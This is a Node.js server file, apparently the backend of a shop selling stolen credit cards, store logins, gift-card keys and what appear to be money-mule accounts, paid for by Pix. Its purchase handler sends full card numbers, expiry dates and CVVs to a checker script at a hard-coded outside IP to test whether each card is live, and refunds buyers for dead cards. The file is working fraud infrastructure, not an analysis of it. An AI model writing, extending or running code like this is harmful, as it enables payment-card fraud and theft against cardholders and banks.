const db = require("./db");
const express = require("express");
const path = require("path");
const app = express();
const axios = require("axios")

const { createServer } = require("http");
const httpServer = createServer(app);
const socketio = require("socket.io");
const io = socketio(httpServer, {
  path: '/socket.io',
  cors: {
    credentials: true
  }
});

const cors = require("cors");
const { json } = require("body-parser");
const { CobrarPix, PegarCob } = require("./pix");

io.on("connection", socket => {
  let { FireStore, GetCart, firebase } = db
  
  socket.on('buyItensCards', async (req) => {
    let err = false
    async  function buy() {
      let user = (await FireStore.collection("users").where("token", "==", req.token).get()).docs[0];
      if (!user) return err = true
      let data = user.data()
      let cart = await GetCart(data.user)
      let idUser = user.id;
      let resp = { ccLive: 0, ccDied: 0 };;
      if (data.money < cart.totalPreco) {
        resp = { message: "Saldo Insuficiente!", error: true }
      } else {
      await data.cart.gift.map(async (e) => {
          for (let i = 0; i < e.quantidade; i++) {
            await FireStore.collection('produtos').doc('gifts').get().then(async doc => {
              let allCard = doc.data();
              let card = allCard[e.type].filter(c => c.value === e.value);
              let code = card[0].keys[0];
              let lastInfos = [];
              let codesWithoutKey = card[0].keys.filter(k => k !== code)
              let lastCardWithnlyValue = doc.data()[e.type].filter(j => j.value === e.value)
              let lastCardWithoutValue = doc.data()[e.type].filter(j => j.value !== e.value)


              await FireStore.collection('users').doc(idUser).get().then(async ret => {
                lastInfos = ret.data().infos

                let obj = {
                  ...lastInfos, gift: [{
                    type: e.type,
                    value: e.value,
                    key: code
                  },
                  ...lastInfos.gift
                  ]
                }

                await FireStore.collection('users').doc(idUser).update({
                  infos: obj
                }).catch(() => err = true)

                await FireStore.collection('produtos').doc('gifts').update({
                  [e.type]: [
                    ...lastCardWithoutValue, {
                      value: e.value,
                      keys: codesWithoutKey
                    }
                  ]
                }).catch(() => err = true)

                            
              })
                        
                        
            })
          }
      })

      await data.cart.cc.map(async (e) => {
        try {
          const AllCardsSnapshot = await FireStore.collection('produtos').doc('cc').get();
        const allCards = await AllCardsSnapshot.data()[e.itemProd]
        const cardBuy = allCards.filter(c => c.id === e.id)[0]
        const cardsWithoutCardBuy = allCards.filter(c => c.id !== e.id)

         console.log(cardBuy)
        
        if (req.checkar) {
          let valid = cardBuy.valid.split('/')
          let card = `${cardBuy.numero}|${valid[0]}|20${valid[1]}|${cardBuy.cvv}`
          await axios.default.get(`http://40.87.111.245/allbins/cielo.php?lista=${card}`)
            .then(async res => {
              let live = await res.data.includes('Aprovada')
              if (live) {
                await FireStore.collection('users').doc(idUser).update({
                    "infos.cc": firebase.default.firestore.FieldValue.arrayUnion(cardBuy)
                }).catch(() => err = true)
                        
                await FireStore.collection('users').doc(idUser).update({
                    "pontos": data.pontos + 20,
                }).catch(() => err = true)
                        
                await FireStore.collection('produtos').doc('cc').update({
                    [e.itemProd]: firebase.default.firestore.FieldValue.arrayRemove(cardBuy)
                }).catch(() => err = true)

                          
                resp.ccLive++;
              } else {
                let moneyNow = await (await FireStore.collection("users").doc(user.id).get()).data().money
                await FireStore.collection('users').doc(idUser).update({
                    "money": moneyNow + cardBuy.value,
                }).catch(() => err = true)
                        
                await FireStore.collection('produtos').doc('cc').update({
                    [e.itemProd]: firebase.default.firestore.FieldValue.arrayRemove(cardBuy)
                }).catch(() => err = true)

                resp.ccDied++;
              }

              let ccNum = ""

              cardBuy.numero.toString().split('').slice(0, 6).map(c => {
                ccNum += c
              })

              socket.emit('ccChecked', {
                card: `${ccNum}XXXXXXXXXX|${valid[0]}|20${valid[1]}|${cardBuy.cvv}`,
                live
              })
                        
              return resp;
            })
        } else {

          await FireStore.collection('users').doc(idUser).update({
              "infos.cc": firebase.default.firestore.FieldValue.arrayUnion(cardBuy)
          }).catch(() => err = true)
              
          await FireStore.collection('users').doc(idUser).update({
              "pontos": data.pontos + 20,
          }).catch(() => err = true)
              
          await FireStore.collection('produtos').doc('cc').update({
              [e.itemProd]: firebase.default.firestore.FieldValue.arrayRemove(cardBuy)
          }).catch(() => err = true)
          }
        } catch (err) {
          socket.emit('finishedBuy', {status: false})
        }
      })

        await data.cart.lara.map(async (e) => {
          const laraAllSnap = await FireStore.collection('produtos').doc('lara').get();
          const laraAll = laraAllSnap.data().arr;
          const laraBuy = laraAll.filter(l => l.id === e.id)[0]
          const laraWithoutLaraBuy = laraAll.filter(l => l.id !== e.id)

          await FireStore.collection('users').doc(idUser).update({
            "infos.lara": firebase.default.firestore.FieldValue.arrayUnion(laraBuy)
          }).catch(() => err = true)
                    
          await FireStore.collection('produtos').doc('lara').update({
            arr: firebase.default.firestore.FieldValue.arrayRemove(laraBuy)
          }).catch(() => err = true)
        })

        await data.cart.login.map(async (e) => {
          for (let i = 0; i < e.quantidade; i++) {
            const loginAllSnap = await FireStore.collection('produtos').doc('login').get();
            const loginAll = loginAllSnap.data().logins;
            const loginBuy = loginAll.filter(l => l.loja === e.loja)[0]
            const loginBuyKeys = loginAll.filter(l => l.loja === e.loja)[0].keys[0]
            const loginWithoutloginBuyKeys = loginAll.filter(l => l.loja === e.loja)[0].keys.slice(1)

            let loginAllWithoutBuy = loginAll.filter(l => l.loja !== e.loja)

            let obj = {
              ...loginBuyKeys,
              loja: e.loja,
              data: req.dataToday
            }

            await FireStore.collection('users').doc(idUser).update({
              "infos.login": firebase.default.firestore.FieldValue.arrayUnion(obj)
            }).catch(() => err = true)

            await FireStore.collection('produtos').doc('login').update({
              logins: [
                {
                  ...loginBuy,
                  keys: [
                    ...loginWithoutloginBuyKeys
                  ]
                },
                ...loginAllWithoutBuy
              ]
            }).catch(() => err = true)
          }
        })

        await data.cart.consultavel.map(async (e) => {
          const consulAllSnap = await FireStore.collection('produtos').doc('consultaveis').get();
          const consulAll = consulAllSnap.data()[e.loja];
          const consulBuy = consulAll.filter(l => l.id === e.id)[0]
          const consulWithoutconsulBuy = consulAll.filter(l => l.id !== e.id)

          await FireStore.collection('users').doc(idUser).update({
            "infos.consultavel": firebase.default.firestore.FieldValue.arrayUnion(consulBuy)
          }).catch(() => err = true)
                    
          await FireStore.collection('produtos').doc('consultaveis').update({
            [e.loja]: firebase.default.firestore.FieldValue.arrayRemove(consulBuy)
          }).catch(() => err = true)
        })
            
        if (!user) return socket.emit("finishedBuy", { status: true })
          
        await FireStore.collection("users").doc(idUser).update({
            cart: {
                cc: [],
                gift: [],
                lara: [],
                login: [],
                consultavel: [],
            }
        }).catch(() => err = true)

        let moneyNow = await (await FireStore.collection("users").doc(user.id).get()).data().money
        await FireStore.collection("users").doc(idUser).update({
            money: moneyNow - cart.totalPreco
        }).catch(() => err = true)
      }
      return resp
    }
    buy()
    setTimeout(() => {
      if (err) {
        socket.emit("finishedBuy", {status: false})
      } else {
        socket.emit("finishedBuy", {status: true})
      }
    }, 10000)
  })

  socket.on('getHistory', async (req) => {
    const cobs = await (await FireStore.collection("users").where("token", "==", req.token).get()).docs[0].data().cobs
    let cobsComprimida = [];

    for (c of cobs) {
      let go = await PegarCob(c.txid)
      cobsComprimida.push({
        status: go.status,
        valor: go.valor.original,
        data: go.calendario.criacao
      })
    }

    socket.emit("historico", cobsComprimida);
  })

  socket.on('getFeed', async (req) => {
    // Mandando Mensagens
    const msgs = await (await FireStore.collection("system").doc("msgs").get()).data().arr
    socket.emit("sendMsgs", msgs);

    // Mandando pontos
    const ccAll = await (await FireStore.collection('produtos').doc("cc").get()).data()
    const ccConsul = await (await FireStore.collection('produtos').doc("consultaveis").get()).data()
    let ccCount = 0;
    let ccBonus = 0;

    ccCount += ccAll.cc.length;
    ccCount += ccAll.ccconsul.length;
    ccCount += ccAll.ccfull.length;
    ccCount += ccAll.ccname.length;

    ccCount += ccConsul.credicard.length;
    ccCount += ccConsul.hipercard.length;
    ccCount += ccConsul.itau.length;
    ccCount += ccConsul.magazine.length;
    ccCount += ccConsul.santander.length;

    ccBonus = ccAll.bonus.length

    socket.emit("sendCountCcs", {
      ccCount,
      ccBonus
    })
  })

  FireStore.collection("system").doc("msgs").onSnapshot(doc => {
    const msgs = doc.data().arr
    socket.broadcast.emit("sendMsgs", msgs);

  })
})

app.use(cors());

app.get('/getCcBonusUser/:user', async(req, res) => {
  let user = req.params.user;

  let response = await db.getCcBonusUser(user)

  res.send(response)
})

app.get('/getCcBonus', async (req, res) => {
  let datas = await db.getCc('bonus');

  res.send(datas)
})


app.use(express.static(path.join(__dirname, "build")))

app.get("/*", function (req, res) {
  res.sendFile(path.join(__dirname, "build", "index.html"));
});

// app.use(express.static(path.join(__dirname, "build")))
// app.get("/*", function (req, res) {
//   res.sendFile(path.join(__dirname, "build", "index.html"));
// });

// app.get("/*", function (req, res) {
//   res.sendFile(path.join(__dirname, "build", "index.html"));
// });

app.post("/prods/login", async (req, res) => {
  const array = await db.getLogins();

  res.send(array);
});

app.post("/consultavel/:loja", async (req, res) => {
  let loja = req.params.loja;
  
  if (!loja) {
    res.statusCode(400)
    res.send("BadRequest")
    return
  }

  const arr = await db.getConsul(loja)

  res.send(arr)
})


app.post("/login", json(), async (req, res) => {
  let { user, pass } = req.body;

  let userInfo;
  await db.LoginUserByUser(user, pass).then((res) => (userInfo = res));

  if (userInfo.error === true) {
    res.statusCode = 401;
    res.send(userInfo);
  } else {
    res.statusCode = 200;
    res.send(userInfo);
  }
});

app.post("/getDatasByToken", json(), async (req, res) => {
  let { token } = req.body;

  let userInfo;
  await db.LoginUserByToken(token).then((res) => (userInfo = res));

  if (userInfo.error === true) {
    res.statusCode = 401;
    res.send(userInfo);
  } else {
    res.statusCode = 200;
    res.send(userInfo);
  }
})

app.post("/login/newuser", json(), async (req, res) => {
  let form = req.body;
  let user = {
    user: req.body.username,
    pass: req.body.password,
    firstName: req.body.nome,
    lastName: req.body.sobrenome,
  };

  let userInfos;
  await db.newUser(user).then((res) => (userInfos = res));

  res.send(userInfos);
});

app.post("/prods/cards", json(), async (req, res) => {
  let giftType = await req.body.card;

  const array = await db.getGiftCard(giftType);

  res.send(array);
});

app.post("/prods/card", json(), async (req, res) => {
  let cardType = await req.body.type;

  const array = await db.getCc(cardType);

  res.send(array);
});

app.post("/prods/lara", json(), async (req, res) => {
  const array = await db.GetLara();

  res.send(array);
})



app.post("/pix/gerar", json(), async (req, res) => {
  let value = Number.parseFloat(req.body.value);
  let user = req.body.user;

  const array = await CobrarPix(value);

  db.AddCobranca(user, array.cob);

  res.send(array.toUser);
});

app.post("/getCart", json(), async (req, res) => {
  const user = req.body.user;

  const resp = await db.GetCart(user);

  res.send(resp);
});

app.post("/postCart", json(), async (req, res) => {
  let user = req.body.user;
  let prod = req.body.prod;

  let resp = await db.PostCart(user, prod);

  res.send(resp);
});

app.post("/removeCart", json(), async (req, res) => {
  let user = req.body.user;
  let prod = req.body.prod;

  await db.DeleteCart(user, prod);

  res.send('ok')
});

app.post("/addMoreOne", json(), async (req, res) => {
  let user = req.body.user;
  let prod = req.body.prod;

  let resDb = await db.addMoreOneOnItem(user, prod);

  // if(resDb.error) res.statusCode = 400;
  // else res.statusCode = 200;

  res.send(resDb);
})

app.post("/rmMoreOne", json(), async (req, res) => {
  let user = req.body.user;
  let prod = req.body.prod;

  await db.rmMoreOneOnItem(user, prod);

  res.send('ok')
})

app.post("/GetInfos", json(), async (req, res) => {
  let token = req.body.token;
  let type = req.body.type;

  let arr = await db.GetInfos(token, type)

  res.send(arr)
})

app.post("/buyCard", json(), async (req, res) => {
  let token = req.body.token.toString();
  let check = req.body.check;

  let json = await db.BuyItensCard(token, check)

  res.send(json)
})

app.post("/changePassword", json(), async (req, res) => {
  const oldPass = req.body.oldPass;
  const newPass = req.body.newPass;
  const token = req.body.token;

  const response = await db.ChangePassword(oldPass, newPass, token)

  if (response.error === true) res.statusCode = 401;
  else res.statusCode = 200;

  res.send(response)
})

app.post('/buyCcBonus', json(), async(req, res) => {
  const token = req.body.token;
  const idCc = req.body.idCc;

  if (!token || !idCc) {
    res.statusCode(400)
    res.send("BadRequest")
    return
  }

  const resp = await db.buyCcBonus(token, idCc)

  res.send(resp)
})

app.post('/webhook(/pix)?', json(), (req, res) => {
  db.PixPayment(req.body.pix[0]);
  res.send('200')
})

app.post('/removeInfo/:type', json(), (req, res) => {
  const { type } = req.params;
  const { token, id } = req.body;
  db.RemoveInfo(token, type, id);
  res.send('ok');
});

httpServer.listen(5000, () => console.log("Run ok"));
